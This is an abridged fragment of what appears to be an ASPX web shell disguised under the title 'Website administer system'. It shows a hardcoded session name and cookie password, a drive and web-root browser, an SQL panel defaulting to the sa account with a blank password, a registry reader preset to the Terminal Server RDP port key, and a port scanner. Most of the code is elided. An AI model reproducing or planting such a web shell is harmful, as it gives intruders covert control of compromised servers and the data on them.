...
<script runat="server">
	...
	public string SessionName="windowsserver2003";
	public string cookiePass="windowsserver2003CookiePass";
	...
	public void Bin_DriveList()
	{
		...
		file+="	WebRoot :	<a href=javascript:Command('change','"+"');>"+Server.MapPath("/")+"</a>";
	...
	{
		Session["Bin_Table"]=null;
		Bin_SQLconnTextBox.Text="server=(local);UID=sa;PWD=;database=master;Provider=SQLOLEDB";
...
<head runat="server">
	<title>Website administer system</title>
<style type="text/css">
	A:link {
...
<body>
	<form id="form1" runat="server"><div style="text-align: center"><asp:Panel ID="Bin_LoginPanel" runat="server" Height="47px" Width="401px">
			...
			<asp:Label ID="Bin_ErrorLabel" runat="server" EnableViewState="False"></asp:Label></asp:Panel>
		...
		<asp:Panel ID="Bin_SQLPanel" runat="server" Visible="False" Width="763px">
			<hr />
			ConnString :
			<asp:TextBox ID="Bin_SQLconnTextBox" runat="server" Width="547px">server=(local);UID=sa;PWD=;database=master;Provider=SQLOLEDB</asp:TextBox><br />
		...
		<asp:Panel ID="Bin_RegPanel" runat="server" Width="763px"><hr /><div style="text-align:left">
			KEY :&nbsp; &nbsp;<asp:TextBox ID="Bin_KeyTextBox" runat="server" Width="595px">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp</asp:TextBox><br />
			VALUE :
			<asp:TextBox ID="Bin_ValueTextBox" runat="server" Width="312px">portnumber</asp:TextBox>&nbsp;<asp:Button
		...
		<asp:Panel ID="Bin_PortPanel" runat="server" Width="763px">
			<hr /><div style="text-align:left">
				...
				PORT :
			<asp:TextBox ID="Bin_PortsTextBox" runat="server" Width="356px">43958</asp:TextBox>
